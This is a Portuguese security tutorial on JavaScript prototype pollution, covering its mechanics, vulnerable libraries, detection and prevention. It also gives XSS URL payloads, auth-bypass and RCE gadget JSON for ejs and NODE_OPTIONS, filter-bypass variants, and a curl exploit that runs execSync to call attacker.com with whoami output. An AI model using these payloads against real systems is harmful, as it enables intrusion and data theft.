---
title: "Prototype Pollution"
---

# Prototype Pollution

# O que é?

Prototype Pollution é uma vulnerabilidade específica de JavaScript que explora a herança prototípica da linguagem. Para entender por que ela existe, é preciso primeiro entender como o modelo de objetos do JavaScript funciona por baixo dos panos.

Em JavaScript, **todo objeto herda propriedades e métodos de `Object.prototype`** — o "ancestral" de todos os objetos. Isso é o que torna possível chamar `.toString()` ou `.hasOwnProperty()` em qualquer objeto, mesmo sem ter definido esses métodos explicitamente: eles estão em `Object.prototype` e são herdados por todos.

Prototype Pollution ocorre quando um atacante consegue **adicionar ou modificar propriedades em `Object.prototype`**, afetando todos os objetos criados na aplicação — não só o objeto manipulado, mas todos os objetos de todos os usuários e toda a lógica interna do servidor.

A vulnerabilidade foi sistematizada e levada a escala por pesquisadores como **James Kettle** e **Gareth Heyes**, que demonstraram que a classe afetava não apenas aplicações individuais, mas dezenas de bibliotecas amplamente adotadas. Antes disso, o padrão existia como problema teórico. Depois, CVEs começaram a aparecer em lodash, jQuery, hoek, minimist, handlebars.

Existem três variantes principais. Na **Client-Side Prototype Pollution**, o atacante injeta propriedades via URL (parâmetros de query ou hash), que são lidas e processadas por código JavaScript no browser — o resultado é XSS ou manipulação de DOM via gadgets. Na **Server-Side Prototype Pollution (SSPP)**, o atacante envia JSON com `__proto__` via body de requisição POST/PUT para uma API Node.js: o servidor executa merge ou assign sem sanitizar chaves, poluindo `Object.prototype` no processo do Node, com resultado potencial de bypass de autenticação ou RCE via gadgets em template engines como `ejs`. A terceira variante, **DOM-Based Prototype Pollution**, ocorre quando a fonte é a query string e o sink é uma operação DOM que usa propriedade herdada do protótipo poluído.

A vulnerabilidade é sutil porque a sintaxe da exploração parece idêntica a qualquer outro dado JSON. `{"__proto__": {"isAdmin": true}}` se parece com dados normais — até que o banco de herança prototípica é compreendido.

---

# Onde é implementado?

JavaScript é a linguagem mais ubíqua da web: presente em **98% dos sites** como linguagem client-side, e, via Node.js, como backend de milhões de aplicações. Essa onipresença faz da Prototype Pollution uma vulnerabilidade com superfície de ataque enormemente ampla.

## Onde aparece no client-side

Qualquer site que use JavaScript no browser e que parse parâmetros de URL com bibliotecas como `qs` ou com código próprio, use `jQuery.extend(true, ...)` para merge de configurações, use lodash para deep merge de objetos de configuração, ou leia dados de `location.search`, `location.hash`, ou `postMessage` e os aplique em objetos é potencialmente vulnerável.

## Onde aparece no server-side (Node.js)

APIs REST em Node.js/Express que aceitam JSON no body e realizam qualquer uma das seguintes operações:

- **lodash.merge / lodash.defaultsDeep / lodash.mergeWith** (versões < 4.17.12) — CVE-2019-10744
- **jQuery.extend** com deep mode (versões < 3.4.0) — CVE-2019-11358
- **Object.assign** com input do usuário
- **hoek.merge** (versões < 4.2.1 e < 5.0.3) — CVE-2018-3728
- **minimist** para parsing de argumentos (versões < 1.2.3) — CVE-2020-7598
- **handlebars** para compilação de templates (versões < 4.5.3) — CVE-2019-19919
- **set-value** (versões < 2.0.1) — CVE-2019-10747
- **object-path** (versões < 0.11.5) — CVE-2020-15256

## Setores afetados

Qualquer produto que usa as bibliotecas acima na versão vulnerável. Isso inclui praticamente qualquer stack JavaScript de médio a grande porte criado antes de 2020, especialmente:

- Aplicações empresariais com Express.js no backend
- CMSs headless (Strapi, Ghost)
- Ferramentas de build e CI/CD que rodam em Node.js
- Parsers de arquivo de configuração em ferramentas CLI
- Aplicações de gaming (onde perfis de usuário são objetos JSON)
- Sistemas de e-commerce com carrinhos representados como objetos

---

# Como funciona de forma adequada?

Para entender a falha, é necessário compreender como a herança prototípica foi projetada para funcionar — e o que está sendo subvertido.

## A cadeia prototípica JavaScript

```
Cadeia de protótipos — comportamento NORMAL:

  let user = { name: "Alice" }
       |
       | __proto__
       v
  Object.prototype
  {
    toString: [Function],
    hasOwnProperty: [Function],
    valueOf: [Function],
    ...
  }
       |
       | __proto__
       v
      null    ← fim da cadeia

Quando user.toString() é chamado:
  1. JS procura toString em user       → não encontra
  2. JS sobe para Object.prototype     → encontra!
  3. Executa Object.prototype.toString

Isso é herança prototípica. Cada objeto herda COMPORTAMENTO
(métodos), mas não compartilha ESTADO (dados mutáveis).
```

## Como herança deve funcionar: herdar comportamento, não estado

```javascript
// Herança prototípica correta:
// Todos os objetos herdam os MESMOS métodos via cadeia
let a = {};
let b = {};

// Ambos herdam toString de Object.prototype
console.log(a.toString());         // [object Object]
console.log(b.toString());         // [object Object]

// Mas propriedades de dados são PRÓPRIAS de cada objeto
a.name = "Alice";
b.name = "Bob";

console.log(a.name);               // "Alice" — própria de 'a'
console.log(b.name);               // "Bob"   — própria de 'b'
// Modificar a.name não afeta b.name — isso é o comportamento correto
```

## Objeto sem protótipo: Object.create(null)

```javascript
// Object.create(null) cria objeto sem cadeia prototípica
const safeDict = Object.create(null);
// safeDict.__proto__ === undefined
// safeDict não herda toString, hasOwnProperty, etc.
// Prototype Pollution em Object.prototype NÃO afeta safeDict

// Útil para dicionários/mapas que não devem herdar comportamento:
safeDict["key"] = "value";
safeDict["__proto__"] = "inofensivo aqui";  // é tratado como dado normal

// Verificar se objeto tem own property sem herança:
// Em vez de: obj.hasOwnProperty('key')  (pode ser sobrescrito via poluição)
// Usar:      Object.prototype.hasOwnProperty.call(obj, 'key')
```

## Object.freeze como proteção em desenvolvimento

```javascript
// Congelar Object.prototype impede qualquer modificação
Object.freeze(Object.prototype);

// Agora tentativas de poluição falham silenciosamente (ou com erro em strict mode)
let obj = {};
obj.__proto__.polluted = true;  // falha silenciosamente
console.log({}.polluted);       // undefined — proteção funcionou

// ATENÇÃO: Object.freeze(Object.prototype) pode quebrar libs que
// adicionam métodos ao protótipo. Usar apenas em dev/test ou com cuidado.
```

## As três vias de ataque ao protótipo

```
Via 1: __proto__ direto
  obj.__proto__.isAdmin = true
  → acessa Object.prototype via accessor especial

Via 2: constructor.prototype
  obj.constructor.prototype.isAdmin = true
  → obj.constructor === Object (função construtora)
  → Object.prototype === Object.prototype

Via 3: aninhado em JSON (mais comum em exploits reais)
  JSON.parse('{"__proto__": {"isAdmin": true}}')
  → o parser cria objeto com chave "__proto__"
  → se usado em Object.assign({}, parsedObj), polui o protótipo
```

## Merge INSEGURO vs SEGURO

```javascript
// ===== INSEGURO =====
function deepMergeUnsafe(target, source) {
    for (let key in source) {
        // 'key' pode ser "__proto__", "constructor", "prototype"
        if (typeof source[key] === 'object') {
            target[key] = deepMergeUnsafe(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
            // Se key === "__proto__" e source[key] === {isAdmin: true}:
            // target.__proto__ = {isAdmin: true}
            // → Object.prototype.isAdmin = true
            // → TODOS os objetos agora têm isAdmin = true!
        }
    }
    return target;
}

// ===== SEGURO — sanitizar chaves perigosas =====
function deepMergeSafe(target, source) {
    const FORBIDDEN_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

    for (let key of Object.keys(source)) {        // Object.keys ignora herança
        if (FORBIDDEN_KEYS.has(key)) continue;    // bloquear chave especial

        if (
            source[key] !== null &&
            typeof source[key] === 'object' &&
            !Array.isArray(source[key])
        ) {
            if (!target[key] || typeof target[key] !== 'object') {
                target[key] = {};
            }
            deepMergeSafe(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// ===== MAIS SEGURO — deep copy via structuredClone (Node.js 17+) =====
// structuredClone não copia propriedades especiais de protótipo
const userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');
const safeClone = structuredClone(userInput);
// safeClone.__proto__ === Object.prototype (normal)
// Object.prototype não foi afetado

// ===== ALTERNATIVA — usar Map para dados dinâmicos =====
const userMap = new Map();
userMap.set("username", "alice");
userMap.set("__proto__", "isso é só uma string aqui");
// Maps não têm cadeia prototípica vulnerável
// __proto__ é tratado como qualquer outra chave
```

## Por que o design prototípico é útil quando funcionando corretamente

```javascript
// Benefício 1: Economia de memória
// Métodos ficam em um único lugar (Object.prototype),
// não duplicados em cada instância

// Benefício 2: Polimorfismo simples
function Animal(name) { this.name = name; }
Animal.prototype.speak = function() {
    return `${this.name} faz um som`;
};

function Dog(name) { Animal.call(this, name); }
Dog.prototype = Object.create(Animal.prototype);
Dog.prototype.constructor = Dog;
Dog.prototype.speak = function() {
    return `${this.name} late`;
};

const d = new Dog("Rex");
d.speak();  // "Rex late" — próprio de Dog.prototype
// Animal.prototype.speak não foi modificado
// ISSO é herança prototípica funcionando como projetado

// O problema surge quando o atacante controla QUAL propriedade
// é adicionada e EM QUAL nível da cadeia.
```

---

# A Falha: Propriedades de Objetos JavaScript Compartilhadas via Cadeia de Protótipos

Prototype Pollution existe por uma característica fundamental do modelo de objetos do JavaScript: todos os objetos herdam propriedades de `Object.prototype` via cadeia de protótipos. Isso significa que se um atacante consegue adicionar ou modificar propriedades em `Object.prototype`, essas propriedades ficam visíveis em **todos** os objetos criados na aplicação — não só os do atacante, mas os de todos os usuários, e a própria lógica interna da aplicação.

A suposição de design errada ocorre quando o desenvolvedor implementa funções de merge/assign de objetos sem restringir quais chaves são permitidas. Uma função de merge que copia recursivamente propriedades de um objeto de origem para um objeto de destino parece inofensiva — até que a origem contenha a chave `__proto__`. Em JavaScript, `obj.__proto__` não é uma propriedade comum: é um accessor especial que dá acesso ao protótipo do objeto. Quando o merge copia `source.__proto__.isAdmin = true` para o destino, não está criando uma propriedade no destino — está modificando `Object.prototype`.

O desenvolvedor cria essa falha sem perceber porque a maioria das funções de deep merge foi escrita antes dessa classe de vulnerabilidade ser bem compreendida, e porque a sintaxe parece igual a qualquer outro merge de dados. Bibliotecas amplamente usadas como lodash (antes da versão 4.17.12), jQuery (antes da 3.4.0), e hoek tinham exatamente esse problema. Código legado que usa versões antigas dessas bibliotecas ainda é vulnerável.

A consequência real antes de ver a exploração: uma vez que `Object.prototype` é poluído com uma propriedade como `isAdmin: true`, qualquer verificação de autorização que faça `if (user.isAdmin)` vai retornar verdadeiro para qualquer usuário — porque mesmo que o objeto `user` não tenha essa propriedade definida diretamente, ele herda de `Object.prototype` poluído. No lado servidor (Node.js), isso pode escalar até RCE via gadgets em template engines como `ejs`.

---

## Causa Raiz

O código vulnerável realiza merge recursivo de objetos sem validar se as chaves são propriedades especiais do protótipo:

```javascript
// VULNERÁVEL — merge recursivo sem sanitização de chaves
function deepMerge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = deepMerge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Atacante envia: {"__proto__": {"isAdmin": true}}
deepMerge({}, JSON.parse(maliciousInput));
// Resultado: Object.prototype.isAdmin = true
// Agora: ({}).isAdmin === true para qualquer objeto!
```

O padrão de código vulnerável é: iterar sobre as chaves do objeto de entrada sem verificar se alguma delas é `__proto__`, `constructor`, ou `prototype`. O padrão seguro:

```javascript
// SEGURO — sanitizar chaves antes do merge
function safeMerge(target, source) {
    const forbidden = ['__proto__', 'constructor', 'prototype'];
    for (let key in source) {
        if (forbidden.includes(key)) continue;  // bloquear chaves perigosas
        if (typeof source[key] === 'object') {
            target[key] = safeMerge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Ou usar Object.create(null) para objetos sem protótipo:
const safeObj = Object.create(null);
// safeObj não herda de Object.prototype
```

O que está faltando é o reconhecimento de que `__proto__` não é uma propriedade de dados comum — é um accessor que acessa o próprio sistema de herança do JavaScript.

---

## Contaminação de Object.prototype: Como Propriedades Se Propagam para Todos os Objetos

### A Cadeia de Protótipos do JavaScript

Em JavaScript, todo objeto tem uma propriedade interna `__proto__` que aponta para seu protótipo. No topo da cadeia está `Object.prototype`:

```javascript
// Demonstração da cadeia de protótipos
let obj = {};
console.log(obj.__proto__ === Object.prototype);  // true
console.log(obj.__proto__.__proto__);              // null (fim da cadeia)

// Todos os objetos herdam de Object.prototype
let a = {};
let b = {};
a.__proto__ === b.__proto__  // true - mesmos apontam para Object.prototype
```

### Como a Poluição Funciona

```javascript
// Contaminar Object.prototype diretamente
let obj = {};
obj.__proto__.isAdmin = true;

// Agora TODOS os objetos têm isAdmin = true!
let user = {};
console.log(user.isAdmin);  // true! (mesmo sem ter definido)

let config = {};
console.log(config.isAdmin);  // true!

// Poluição via path de propriedade aninhado
let malicious = {"__proto__": {"isAdmin": true}};
// Se a aplicação fizer Object.assign({}, malicious):
// Object.prototype.isAdmin agora é true

// Usando constructor.prototype (alternativa ao __proto__)
obj.constructor.prototype.isAdmin = true;
```

### Por Que Isso é Perigoso

```javascript
// Cenário típico vulnerável:
function checkAdmin(user) {
    if (user.isAdmin) {  // user.isAdmin → herdado do protótipo poluído!
        return true;
    }
    return false;
}

// Antes da poluição
checkAdmin({username: "attacker"});  // false (correto)

// Depois da poluição (obj.__proto__.isAdmin = true)
checkAdmin({username: "attacker"});  // true! (bypass de autenticação)
```

---

## Discovery

### Client-Side Prototype Pollution

#### Fontes de Input Controlável pelo Atacante

```javascript
// 1. location.search (parâmetros da URL)
// URL: https://target.com/?__proto__[isAdmin]=true
let params = new URLSearchParams(location.search);
// Se a aplicação parseia params e faz: obj[key] = value
// Onde key pode ser "__proto__" → poluição!

// 2. location.hash
// URL: https://target.com/#__proto__[isAdmin]=true

// 3. JSON.parse (se o JSON vier de input do usuário)
let data = JSON.parse(userInput);  // {"__proto__": {"isAdmin": true}}
Object.assign({}, data);           // poluição!

// 4. postMessage
window.addEventListener('message', function(event) {
    Object.assign({}, event.data);  // data controlada pelo atacante
});
```

#### Testando no Browser (DevTools)

```javascript
// Abrir DevTools → Console

// Teste 1: Verificar se __proto__ em URL é processado
// Navegar para: https://target.com/?__proto__[polluted]=true
Object.prototype.polluted  // Se retornar 'true' → vulnerável!

// Teste 2: Testar via hash
// Navegar para: https://target.com/#__proto__[polluted]=true
Object.prototype.polluted

// Teste 3: Payload simples no search
// https://target.com/?constructor[prototype][polluted]=true
Object.prototype.polluted
```

#### Ferramentas de Discovery

```bash
# ppfuzz - ferramenta específica para client-side prototype pollution
git clone https://github.com/nikitastupin/ppfuzz.git
cd ppfuzz
npm install
node ppfuzz.js --url https://target.com --timeout 10000

# DOM Invader (Burp Suite)
# Extensão do browser integrada ao Burp
# Menu DOM Invader → Prototype Pollution → Scan

# Plugin Burp: "server-side-prototype-pollution" no BApp Store
```

### Server-Side Prototype Pollution (Node.js)

#### Testando Blind

```bash
# Enviar payload via POST JSON
curl -s -X POST https://target.com/api/user \
  -H 'Content-Type: application/json' \
  -d '{"__proto__": {"polluted": true}}'

# Via PUT
curl -s -X PUT https://target.com/api/user/1 \
  -H 'Content-Type: application/json' \
  -d '{"constructor": {"prototype": {"polluted": true}}}'

# Verificar se a poluição alterou comportamento do servidor
# Por exemplo, adicionar propriedade que aparece em respostas JSON
curl -s -X POST https://target.com/api/data \
  -H 'Content-Type: application/json' \
  -d '{"__proto__": {"status": "polluted"}}'

# Se a resposta incluir "status: polluted" = vulnerável
```

#### Payload de Detecção com JSON body

```json
{
  "__proto__": {
    "polluted": "yes"
  }
}
```

```json
{
  "constructor": {
    "prototype": {
      "polluted": "yes"
    }
  }
}
```

---

## Exploitation

### Client-Side: XSS via Prototype Pollution

O fluxo de exploit client-side é:
1. Encontrar uma **fonte** (source) onde input do atacante entra na aplicação
2. Encontrar um **gadget** (sink) que usa o protótipo poluído para executar código

#### Gadgets Comuns

**jQuery < 3.4.0 (CVE-2019-11358):**
```javascript
// Gadget: jQuery.extend(true, ...) com deep merge vulnerável
let payload = JSON.parse('{"__proto__": {"xss": "<img src=x onerror=alert(1)>"}}');
jQuery.extend(true, {}, payload);  // polui Object.prototype.xss

// Gadget: jQuery html() com propriedade herdada
// Se Object.prototype.html = "<img src=x onerror=alert(1)>":
$('#element').html();  // executa o XSS!

// Payload via URL para jQuery vulnerável
// https://target.com/?__proto__[onerror]=alert(1)
```

**Bootstrap:**
```javascript
// Bootstrap usa data-* attributes para configuração
// Gadget: data-sanitize pode ser poluído
Object.prototype['data-sanitize'] = false;
```

**Template Engines:**
```javascript
// Gadget: Handlebars - template injection via prototype
Object.prototype.pendingContent = "<script>alert(1)<\/script>";

// Pug/Jade
Object.prototype.compileDebug = true;

// Lodash template
Object.prototype.sourceURL = "//evil.com/";
```

**setTimeout/eval com string:**
```javascript
// Se a aplicação usa setTimeout com string (eval implícito)
Object.prototype.delay = "alert(1)";
// E algum código faz: setTimeout(config.delay, 1000)
// Como config.delay é herdado do protótipo = XSS!
```

#### Exemplo Completo de Exploit Client-Side

```
URL: https://target.com/?__proto__[innerHTML]=<img/src/onerror=alert(document.cookie)>

Processo:
1. URL parser transforma parâmetros em objeto
2. Aplicação chama algo como: Object.assign(config, urlParams)
3. __proto__[innerHTML] polui Object.prototype.innerHTML
4. jQuery (ou vanilla JS) usa innerHTML herdado ao criar elemento
5. XSS executado!
```

**DOM Clobbering (técnica relacionada):**
```html
<!-- DOM Clobbering: usar elementos HTML para sobrescrever variáveis JS -->
<!-- Se a aplicação verifica: if (!window.isSecure) { doSomethingDangerous() } -->

<img name="isSecure" id="isSecure">
<!-- window.isSecure agora aponta para o elemento img (truthy!) -->
```

### Server-Side: Node.js Prototype Pollution

#### Padrões Vulneráveis

```javascript
// Padrão 1: Object.assign com input do usuário
app.post('/api/user', (req, res) => {
    let user = {};
    Object.assign(user, req.body);  // VULNERAVEL se body tem __proto__
    // user agora tem os dados do usuário
    // MAS também poluiu Object.prototype!
});

// Padrão 2: merge recursivo (lodash vulnerável)
const _ = require('lodash');  // versão < 4.17.12

app.post('/settings', (req, res) => {
    _.merge(config, req.body);  // VULNERAVEL
});

// Padrão 3: spread com JSON.parse
app.post('/data', (req, res) => {
    const data = JSON.parse(req.body.json);
    const result = {...data};  // NÃO polui diretamente
    // Mas: Object.assign({}, data) POLUI!
});
```

#### Gadgets de RCE em Node.js

**Gadget 1: ejs template engine - RCE direto:**
```json
{
    "__proto__": {
        "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id > /tmp/pwned');x"
    }
}
```

**Gadget 2: NODE_OPTIONS environment variable:**
```json
{
    "__proto__": {
        "env": {
            "NODE_OPTIONS": "--require /tmp/rce.js"
        },
        "shell": "node"
    }
}
```

**Gadget 3: Pug template engine:**
```json
{
    "__proto__": {
        "compileDebug": true,
        "self": true
    }
}
```

**Skeleton Key - bypass de autenticação:**
```json
{
    "__proto__": {
        "admin": true,
        "authenticated": true,
        "role": "admin",
        "isAdmin": true
    }
}
```

#### Exploit Server-Side Passo a Passo

```bash
# Passo 1: Identificar endpoint que usa Object.assign ou lodash.merge

# Passo 2: Verificar vulnerabilidade com payload de detecção
curl -s -X POST https://target.com/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"__proto__": {"polluted": "prototype_pollution_test"}}'

# Passo 3: Verificar se nova propriedade aparece nas respostas
curl -s https://target.com/api/settings | grep polluted

# Passo 4: Se vulnerável, tentar RCE com gadget ejs
curl -s -X POST https://target.com/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"curl http://attacker.com/$(whoami)\");x"}}'

# Passo 5: Verificar OOB no servidor do atacante
# nc -lvp 80 ou python3 -m http.server 80
```

---

## Bibliotecas Vulneráveis

### Versões Afetadas

| Biblioteca | Versão Vulnerável | CVE | Padrão Vulnerável |
|-----------|-------------------|-----|-------------------|
| lodash | < 4.17.12 | CVE-2019-10744 | `_.merge()`, `_.mergeWith()`, `_.defaultsDeep()` |
| jQuery | < 3.4.0 | CVE-2019-11358 | `$.extend(true, ...)` com deep merge |
| hoek | < 4.2.1 ou < 5.0.3 | CVE-2018-3728 | `hoek.merge()` |
| minimist | < 1.2.3 | CVE-2020-7598 | parsing de argumentos CLI |
| handlebars | < 4.5.3 | CVE-2019-19919 | compilação de templates |
| deepmerge | várias | - | merge recursivo sem sanitização |
| set-value | < 2.0.1 | CVE-2019-10747 | set de paths aninhados |
| object-path | < 0.11.5 | CVE-2020-15256 | acesso a paths de objeto |

### Testando Manualmente Lodash

```javascript
// Verificar se lodash.merge é vulnerável (Node.js REPL)
const _ = require('lodash');

let payload = JSON.parse('{"__proto__": {"admin": true}}');
_.merge({}, payload);

console.log({}.admin);  // true = VULNERAVEL
                        // undefined = patchado
```

---

## Ferramentas

### ppfuzz (Client-Side)

```bash
# Instalação
npm install -g ppfuzz

# Uso básico
ppfuzz --url https://target.com

# Com cookies (para aplicações autenticadas)
ppfuzz --url https://target.com --cookies "session=abc123"

# Com timeout maior
ppfuzz --url https://target.com --timeout 30000

# Exemplo de saída vulnerável:
# [FOUND] https://target.com/?__proto__[innerHTML]=<img/src/onerror=alert()>
# Gadget: jQuery html()
```

### Burp Suite Extension

```
# Instalar "server-side-prototype-pollution" no BApp Store
# Disponível apenas para Burp Suite Professional

# Uso:
# 1. Navegar na aplicação com Burp ativo
# 2. Botão direito na requisição → Extensions → SSPP Scanner
# 3. Analisar resultados
```

### Script de Detecção Manual

```python
#!/usr/bin/python3
import requests
import json

TARGET = "http://target.com"

def test_sspp(endpoint, method="POST"):
    """Testa Server-Side Prototype Pollution em um endpoint"""
    
    # Payload de detecção
    payload = {
        "__proto__": {
            "polluted": "SSPP_TEST_123"
        }
    }
    
    # Enviar payload
    if method == "POST":
        r = requests.post(f"{TARGET}{endpoint}",
                         json=payload,
                         headers={"Content-Type": "application/json"})
    else:
        r = requests.put(f"{TARGET}{endpoint}",
                        json=payload,
                        headers={"Content-Type": "application/json"})
    
    print(f"[*] Status: {r.status_code}")
    
    # Fazer uma requisição normal e ver se a propriedade aparece
    r2 = requests.get(f"{TARGET}{endpoint}")
    if "SSPP_TEST_123" in r2.text:
        print("[!] VULNERABLE! Prototype pollution detected!")
        return True
    
    # Tentar via constructor.prototype
    payload2 = {
        "constructor": {
            "prototype": {
                "polluted": "SSPP_TEST_456"
            }
        }
    }
    requests.post(f"{TARGET}{endpoint}", json=payload2,
                 headers={"Content-Type": "application/json"})
    r3 = requests.get(f"{TARGET}{endpoint}")
    if "SSPP_TEST_456" in r3.text:
        print("[!] VULNERABLE via constructor.prototype!")
        return True
    
    print("[-] Not vulnerable (or blind)")
    return False

test_sspp("/api/settings")
test_sspp("/api/user")
```

---

## Bypass de Sanitização

### Alternativas ao __proto__ Direto

```javascript
// Se a aplicação bloqueia "__proto__"

// Alternativa 1: constructor.prototype
{"constructor": {"prototype": {"isAdmin": true}}}

// Alternativa 2: __proto__ via URL encoding
// (alguns parsers não normalizam)
// %5F%5Fproto%5F%5F  (URL decoded: __proto__)

// Alternativa 3: Nested bypass
{"a": {"b": {"__proto__": {"isAdmin": true}}}}
// Se o código faz: deep_merge(config, input) sem sanitizar recursivamente

// Alternativa 4: Array index para bypass
[{"__proto__": {"isAdmin": true}}]
```

### Lodash < 4.17.12 - Vulnerabilidade Detalhada

```javascript
// Versão vulnerável (antes do patch)
const _ = require('lodash');

// merge() não verificava propriedades especiais
let source = JSON.parse('{"__proto__":{"polluted":true}}');
_.merge({}, source);
console.log({}.polluted);  // true = VULNERAVEL

// mergeWith() - mesmo problema
_.mergeWith({}, source, (obj, src) => src);

// defaultsDeep() - ainda mais perigoso
_.defaultsDeep({}, {"__proto__": {"admin": true}});
console.log({}.admin);  // true

// A partir de 4.17.12, lodash sanitiza __proto__ e constructor
// Mas código que usa versões antigas ainda é vulnerável!
```

---

## Detecção e Prevenção

### Como Detectar (Defensivo)

```javascript
// Verificar se Object.prototype foi poluído
function checkPrototypePollution() {
    const forbidden = ['isAdmin', 'admin', 'polluted'];
    for (const key of forbidden) {
        if (Object.prototype.hasOwnProperty(key)) {
            console.error('PROTOTYPE POLLUTION DETECTED!', key);
            return true;
        }
    }
    return false;
}

// Monitorar mudanças em Object.prototype
const handler = {
    set(target, prop, value) {
        if (target === Object.prototype) {
            console.error(`Prototype pollution attempt: ${prop} = ${value}`);
            return false;  // bloqueio silencioso
        }
        target[prop] = value;
        return true;
    }
};
```

### Como Prevenir

```javascript
// 1. Usar Object.create(null) para objetos sem protótipo
const safeObj = Object.create(null);
// safeObj não herda de Object.prototype → poluição não afeta!

// 2. Sanitizar inputs antes de merge
function sanitize(obj) {
    const forbidden = ['__proto__', 'constructor', 'prototype'];
    if (obj && typeof obj === 'object') {
        for (const key of Object.keys(obj)) {
            if (forbidden.includes(key)) {
                delete obj[key];
            } else if (typeof obj[key] === 'object') {
                sanitize(obj[key]);  // recursivo
            }
        }
    }
    return obj;
}

// 3. Usar lodash >= 4.17.12 (patchado)

// 4. Object.freeze para desenvolvimento
Object.freeze(Object.prototype);
// Tentativas de poluição falham silenciosamente

// 5. Usar Map ao invés de objetos literais
const userMap = new Map();
userMap.set('username', 'alice');
// Maps não têm cadeia de protótipo vulnerável

// 6. JSON Schema validation (bloqueia __proto__ por additionalProperties: false)
// Usar ajv ou similar com schema rigoroso
```

---

## Resumo dos Payloads

```javascript
// ===== CLIENT-SIDE (URL) =====
// https://target.com/?__proto__[isAdmin]=true
// https://target.com/#__proto__[xss]=<img/src/onerror=alert(1)>
// https://target.com/?constructor[prototype][isAdmin]=true
// https://target.com/?__proto__[innerHTML]=<img/src/onerror=alert(document.cookie)>
```

```json
// ===== SERVER-SIDE (JSON body) =====

// Skeleton key / auth bypass
{"__proto__": {"isAdmin": true, "authenticated": true, "role": "admin"}}

// Bypass via constructor
{"constructor": {"prototype": {"isAdmin": true}}}

// RCE via ejs gadget
{
    "__proto__": {
        "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id>/tmp/pwned');x"
    }
}

// RCE via NODE_OPTIONS
{
    "__proto__": {
        "env": {"NODE_OPTIONS": "--require /proc/self/environ"},
        "shell": "node"
    }
}

// Detection payload (blind)
{"__proto__": {"polluted": "SSPP_DETECTED"}}
{"__proto__": {"JSON spaces": 10}}
```

```bash
# ===== CURL EXEMPLOS =====

# Bypass de autenticação
curl -X POST https://target.com/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"__proto__": {"admin": true}}'

# Detecção
curl -X POST https://target.com/api/data \
  -H 'Content-Type: application/json' \
  -d '{"__proto__": {"status": "polluted"}}'

# Via constructor (bypass de filtro de __proto__)
curl -X POST https://target.com/api/data \
  -H 'Content-Type: application/json' \
  -d '{"constructor": {"prototype": {"admin": true}}}'
```

---

## Módulos Relacionados

O módulo [`01_xss_fundamentos.md`](01_xss_fundamentos.md) cobre XSS clássico que prototype pollution pode disparar via gadgets client-side — a poluição prepara o ambiente para que código JavaScript legítimo já presente na página execute ações maliciosas. As técnicas avançadas de XSS nas quais prototype pollution serve como vetor alternativo estão em [`02_xss_avancado_e_filter_bypass.md`](02_xss_avancado_e_filter_bypass.md).
